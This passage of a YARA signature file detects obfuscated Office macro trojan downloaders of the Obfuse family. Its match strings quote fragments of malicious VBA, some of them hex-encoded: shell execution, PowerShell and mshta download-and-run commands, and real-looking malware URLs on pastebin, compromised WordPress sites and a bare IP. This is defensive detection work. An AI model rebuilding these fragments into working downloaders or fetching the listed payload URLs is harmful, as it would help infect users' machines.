        $x_1_4 = "= DHlbKUIKYUGkgjHVFIum(\"fyf/jjsu\")" ascii //weight: 1
        $x_1_5 = "prqhhqrabc = \"fadzjgdilazu\"" ascii //weight: 1
        $x_1_6 = "\"open\", mqQECwOLiDcGDHGFSDxxfgsXHFHXfrxhfxfcjFK, \"\", vbNullString, vbNormalFocus" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PS_2147759950_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PS!MTB"
        threat_id = "2147759950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "I-Worm.Kamila" ascii //weight: 1
        $x_1_2 = "Kill \"C:\\kama.dll" ascii //weight: 1
        $x_1_3 = "wsh.Run \"C:\\kam_drop.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PS_2147759950_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PS!MTB"
        threat_id = "2147759950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "uRlMon" ascii //weight: 1
        $x_1_2 = "CreateDirectoryA" ascii //weight: 1
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
        $x_1_4 = "C:\\Huyt\\Rikol\\Gertik" ascii //weight: 1
        $x_1_5 = "URLDownl" ascii //weight: 1
        $x_1_6 = "oadToFileA-" ascii //weight: 1
        $x_1_7 = "http://camilladerrico.com/fonts/reldevops.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DRU_2147760252_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DRU!MTB"
        threat_id = "2147760252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(46) + Chr(101) + Chr(120) + Chr(101)" ascii //weight: 1
        $x_1_2 = "second_name = \"revisione_contabile_2019\"" ascii //weight: 1
        $x_1_3 = "\"ht\" + \"tp\" + \":\" + \"/\" + \"/\" + ipUrra + \"/\" + pay_name + ext_exe" ascii //weight: 1
        $x_1_4 = "pay_name = \"simple_shell\"" ascii //weight: 1
        $x_1_5 = "first_oct + \".\" + second_oct + \".\" + third_oct + \".\" + fourth_oct" ascii //weight: 1
        $x_1_6 = "downloadFile()" ascii //weight: 1
        $x_1_7 = "renameFile()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PC_2147760396_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PC!MTB"
        threat_id = "2147760396"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "68 74 74 70 3A 2F 2F 6D 61 69 6C 2E 7A 61 6E 65 6C 6C 6F 2E 61 64 76 2E 62 72 2F 77 6F 72 64 70 72 65 73 73 2F 77 70 2D 69 6E 63 6C 75 64 65 73 2F 31 61 2F 69 62 2E 65 78 65" ascii //weight: 1
        $x_1_2 = {36 38 20 37 34 20 37 34 20 37 30 20 37 33 20 33 41 20 32 46 20 32 46 20 36 31 20 32 45 20 37 35 20 36 37 20 37 35 20 37 35 20 32 45 20 37 33 20 36 35 20 32 46 20 [0-20] 20 32 45 20 36 41 20 37 30 20 36 37}  //weight: 1, accuracy: Low
        $x_1_3 = {36 38 20 37 34 20 37 34 20 37 30 20 33 41 20 32 46 20 32 46 20 36 31 20 37 32 20 36 46 20 36 44 20 36 31 20 37 34 20 36 35 20 37 32 20 36 31 20 37 30 20 36 39 20 36 31 20 36 33 20 36 43 20 36 39 20 36 45 20 36 39 20 36 33 20 36 31 20 36 32 20 37 32 20 36 31 20 37 33 20 36 39 20 36 43 20 32 45 20 36 33 20 36 46 20 36 44 20 32 45 20 36 32 20 37 32 20 32 46 20 37 37 20 37 30 20 32 44 20 36 33 20 36 37 20 36 39 20 32 46 20 [0-10] 20 32 45 20 36 41 20 37 30 20 36 37}  //weight: 1, accuracy: Low
        $x_1_4 = {36 38 20 37 34 20 37 34 20 37 30 20 37 33 20 33 41 20 32 46 20 32 46 20 36 33 20 36 31 20 36 45 20 36 32 20 36 35 20 37 32 20 37 32 20 36 31 20 36 33 20 36 38 20 36 31 20 36 44 20 36 32 20 36 35 20 37 32 20 37 33 20 32 45 20 36 33 20 36 46 20 36 44 20 32 45 20 36 31 20 37 35 20 32 46 20 [0-50] 20 32 45 20 36 35 20 37 38 20 36 35}  //weight: 1, accuracy: Low
        $x_1_5 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_6 = "43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 73 76 63 68 6f 73 74 33 32 2e 65 78 65" ascii //weight: 1
        $x_1_7 = ".Open \"G\" + \"E\" + \"T\", Url" ascii //weight: 1
        $x_1_8 = ".Run RUNCMD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_WF_2147760631_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.WF!MTB"
        threat_id = "2147760631"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MGSA = wKgOgix.Create(KbzjLCuc, Null, Null, intProcessID)" ascii //weight: 1
        $x_1_2 = "Dim wKgOgix, KbzjLCuc, MGSA, intProcessID" ascii //weight: 1
        $x_1_3 = "cRwY = Range(\"C500\").Comment.Text" ascii //weight: 1
        $x_1_4 = "Qgiwd = Split(cRwY, \"***\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LA_2147760674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LA!MTB"
        threat_id = "2147760674"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"w\" & Replace(\"wsconroniponton /bon /one" ascii //weight: 1
        $x_1_2 = "c:\\Users\\Public\" & Empty & \"\\Documents\\\" & \"25" ascii //weight: 1
        $x_1_3 = "Sub MakeWebQuery()" ascii //weight: 1
        $x_1_4 = "ll = \"htt\"" ascii //weight: 1
        $x_1_5 = "ll = ll & \"ps:\"" ascii //weight: 1
        $x_1_6 = "ll = ll & \"//sherpa\"" ascii //weight: 1
        $x_1_7 = "ll = ll & \".rest/wp-\" & Empty & Empty & \"\" & \"info.p\"" ascii //weight: 1
        $x_1_8 = "ll = ll & \"hp\"" ascii //weight: 1
        $x_1_9 = "Set shFirstQtr" ascii //weight: 1
        $x_1_10 = "URL;\" & ll, Destination:= _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DU_2147760795_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DU!MTB"
        threat_id = "2147760795"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "110,115,123,103,100,121,110,121" ascii //weight: 1
        $x_1_2 = "104,49,87,123,121,100,108,121,106,102,111,106,127,106,87,106,81,110,63,66,37,99,127,106" ascii //weight: 1
        $x_1_3 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-15] 2c 20 22 20 22 2c 20 53 57 5f 53 48 4f 57 4e 4f 52 4d 41 4c}  //weight: 1, accuracy: Low
        $x_1_4 = "ageu0o(aXLBA(aU0Cmw) Xor 11)" ascii //weight: 1
        $x_1_5 = "ActiveDocument.Content" ascii //weight: 1
        $x_1_6 = "Split(aqGmn, Chr(11 + 33))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RF_2147761057_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RF!MTB"
        threat_id = "2147761057"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UserPath & \"\\salaires.vbs\"" ascii //weight: 1
        $x_1_2 = "GetFile(url, targetPath)" ascii //weight: 1
        $x_1_3 = "fso.BuildPath(targetPath, \"\"\\tomcat3.exe\"\")\"" ascii //weight: 1
        $x_1_4 = "httpRequest.Open \"\"GET\"\", url" ascii //weight: 1
        $x_1_5 = "outFile.Write Chr(Asc" ascii //weight: 1
        $x_1_6 = "WshShell.Run outPath\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PV_2147761169_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PV!MTB"
        threat_id = "2147761169"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".VB_ProcData.VB_Invoke_Func = \"Project.MacroBle.AutoOpen\"" ascii //weight: 1
        $x_1_2 = ".SaveAs (GetPath$ + \"NORMAL1.DOT\")" ascii //weight: 1
        $x_1_3 = "'MsgBox \"Fuck up !" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PV_2147761169_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PV!MTB"
        threat_id = "2147761169"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 ?? ?? ?? ?? ?? 20 2b 20 22 63 72 69 70 74 2e 73 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "String = \"c:\\programdata\\" ascii //weight: 1
        $x_6_3 = {28 30 29 20 2b 20 22 76 72 33 32 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c ?? ?? ?? ?? ?? 2e 74 78 74 22 2c 20 22 77 73 22}  //weight: 6, accuracy: Low
        $x_6_4 = {28 30 29 20 2b 20 22 76 72 33 32 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c ?? ?? ?? ?? ?? 2e 70 64 66 22 2c 20 22 77 73 22}  //weight: 6, accuracy: Low
        $x_1_5 = {53 70 6c 69 74 28 ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_6 = ".Open \"GET" ascii //weight: 1
        $x_1_7 = ".responsebody" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_6_*) and 5 of ($x_1_*))) or
            ((2 of ($x_6_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PAA_2147761171_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAA!MTB"
        threat_id = "2147761171"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VB_Name = \"varFuncPtr\"" ascii //weight: 1
        $x_1_2 = "CreateObject(storageArgLib(\"llehs.tpircsw\"))." ascii //weight: 1
        $x_1_3 = "= Mid(loadListbox, memTextbox, 1000000)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAA_2147761171_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAA!MTB"
        threat_id = "2147761171"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 58 45 43 28 22 63 6d 64 20 2f 63 20 70 6f [0-2] 77 65 72 [0-2] 73 68 65 6c 6c 20 2d 77 20 31 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 [0-2] 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 33 70 73 61 71 6d 6d 27 2c 28 24 65 6e 76 3a 61 70 70 64 61 74 61 20 2b 20 27 5c [0-16] 2e 65 78 65 27 29 29 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {45 58 45 43 28 22 63 6d 64 20 2f 63 20 70 6f [0-2] 77 65 72 [0-2] 73 68 65 6c 6c 20 2d 77 20 31 20 53 74 61 72 74 2d 53 6c 65 65 70 20 [0-4] 3b 20 73 54 41 72 74 2d [0-6] 6f 63 65 73 73 20 24 65 6e 76 3a 61 70 70 64 61 74 61 5c [0-16] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YT_2147761381_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YT!MTB"
        threat_id = "2147761381"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\1.com" ascii //weight: 1
        $x_1_2 = "c:\\programdata\\1.xsl" ascii //weight: 1
        $x_1_3 = "frm.textbox1.text" ascii //weight: 1
        $x_1_4 = "Chr(34)" ascii //weight: 1
        $x_1_5 = "Call VBA.FileCopy(avmyIw, a62NB)" ascii //weight: 1
        $x_1_6 = "(\"comments\") & ae0SDO" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBB_2147761471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBB!MTB"
        threat_id = "2147761471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = ".exec frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBB_2147761471_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBB!MTB"
        threat_id = "2147761471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ie.Navigate \"https://pastebin.com/raw/PMwGWkmh" ascii //weight: 1
        $x_1_2 = "Dim payload: payload = ie.Document.Body" ascii //weight: 1
        $x_1_3 = "= Environ(\"TEMP\") & \"\\CVR" ascii //weight: 1
        $x_1_4 = "objFSO.DeleteFile p" ascii //weight: 1
        $x_1_5 = "obj.Document.Application.ShellExecute \"rundll32" ascii //weight: 1
        $x_1_6 = "objFSO.CreateTextFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBC_2147761472_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBC!MTB"
        threat_id = "2147761472"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ(\"AppDATA" ascii //weight: 1
        $x_1_2 = {34 74 6f 70 2e 69 6f 2f [0-15] 2e 6a 70 67 3c 00 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 62 2e 74 6f 70}  //weight: 1, accuracy: Low
        $x_1_3 = "= CreateObject(\"WScript.Shell" ascii //weight: 1
        $x_1_4 = "objShell.Run \"avg.vbe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBC_2147761472_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBC!MTB"
        threat_id = "2147761472"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= DateDiff(\"s\", \"01/01/1970 00:00:00\", Now())" ascii //weight: 1
        $x_1_2 = {67 65 74 68 6f 73 74 62 79 6e 61 6d 65 20 28 74 73 20 26 20 22 2e [0-8] 2e 63 61 63 68 65 64 6e 73 2e 69 6f 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".FileExists(cop + \"\\Microsoft\\EdgeFgs\\FileSyncShell64.dll\")" ascii //weight: 1
        $x_1_4 = ".SaveToFile cop + \"\\Temp\\wct\" + CStr(wct) + \".tmp\", 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBD_2147761577_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBD!MTB"
        threat_id = "2147761577"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "S.Dat" ascii //weight: 1
        $x_1_2 = "= \"CewcCewmCewd.CeweCewxCewe" ascii //weight: 1
        $x_1_3 = {73 65 72 76 69 63 65 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 22 20 26 20 22 72 69 70 74 2e 53 68 [0-16] 65 6c 6c 22 2c 20 22 22 29 2e 52 75 6e 20 [0-16] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 43 65 77 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBE_2147761578_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBE!MTB"
        threat_id = "2147761578"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "http://ordinateur.ogivart.us/editor/Qpo7OAOnbe/" ascii //weight: 4
        $x_4_2 = "http://old.liceum9.ru/images/0/" ascii //weight: 4
        $x_4_3 = "http://ostadsarma.com/wp-admin/pYk64Hh3z5hjnMziZ/" ascii //weight: 4
        $x_4_4 = "http://www.cuneytkocas.com/wp-content/VSnofpES1wO2CcVob/" ascii //weight: 4
        $x_4_5 = "http://towardsun.net/admin/BYGGkrYAnT/" ascii //weight: 4
        $x_4_6 = "http://k-antiques.jp/wp-includes/SCYdA6TLohYk2/" ascii //weight: 4
        $x_1_7 = "D\"&\"l\"&\"lR\"&\"egister\"&\"Serve\"&\"r" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 1 of ($x_1_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PBG_2147761666_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBG!MTB"
        threat_id = "2147761666"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& \"lic\\456trytgre3e45yrthtgr.exe" ascii //weight: 1
        $x_1_2 = {52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 61 61 64 72 6e 67 6d 36 72 73 68 61 61 64 72 6e 67 6d 36 6c 6c 2f 57 20 30 31 20 63 75 [0-4] 72 6c 20 68 74 74 [0-1] 70 3a 2f 2f 39 31 2e 31 30 37 2e 32 31 30 2e 32 30 37 2f 74 69 6e 79 74 61 73 6b 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBH_2147761673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBH!MTB"
        threat_id = "2147761673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 53 68 65 65 74 2e 52 61 6e 67 65 28 22 [0-6] 22 2c 20 22 [0-8] 22 29 2e 4c 6f 63 6b 65 64 20 3d 20 54 72 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 65 63 32 2d 31 38 2d 31 38 34 2d 31 37 2d 31 32 2e 65 75 2d 63 65 6e 74 72 61 6c 2d 31 2e 63 6f 6d 70 75 74 65 2e 61 6d 61 7a 6f 6e 61 77 73 2e 63 6f 6d 2f 73 74 61 6e 64 61 72 64 63 68 61 72 74 65 72 65 64 2f [0-21] 2f 31 38 30 38 32 31 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "= Environ(\"Temp\") & \"\\leakdetails.log" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBH_2147761673_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBH!MTB"
        threat_id = "2147761673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "68 74 74 70 3A 2F 2F 61 76 65 6E 39 33 72 2E 72 75 2F 75 70 6C 6F 61 64 73 2F 50 72 6F 63 65 73 73 4C 61 73 73 6F 2E 65 78 65" ascii //weight: 1
        $x_1_2 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_3 = {34 33 20 33 61 20 35 63 20 35 35 20 37 33 20 36 35 20 37 32 20 37 33 20 35 63 20 35 30 20 37 35 20 36 32 20 36 63 20 36 39 20 36 33 20 35 63 20 [0-30] 20 32 65 20 36 35 20 37 38 20 36 35}  //weight: 1, accuracy: Low
        $x_1_4 = ".Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBI_2147761678_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBI!MTB"
        threat_id = "2147761678"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 6d 73 68 74 61 2e 65 78 65 20 6a 61 76 61 73 63 72 69 70 74 3a [0-6] 3d 28 47 65 74 4f 62 6a 65 63 74 28 22 22 73 63 72 69 70 74 3a 68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 53 74 65 41 6d 65 52 2f 6d 61 6c 77 65 72 6a 6f 62 73 2f 6d 61 73 74 65 72 2f 73 63 72 69 70 74 6c 65 74 22 22 29 29 2e 45 78 65 63 28 29 3b 63 6c 6f 73 65 28 29 3b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBJ_2147761679_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBJ!MTB"
        threat_id = "2147761679"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ(\"AppData\")" ascii //weight: 1
        $x_1_2 = {2b 20 43 68 72 28 33 34 29 20 2b 20 [0-32] 20 2b 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
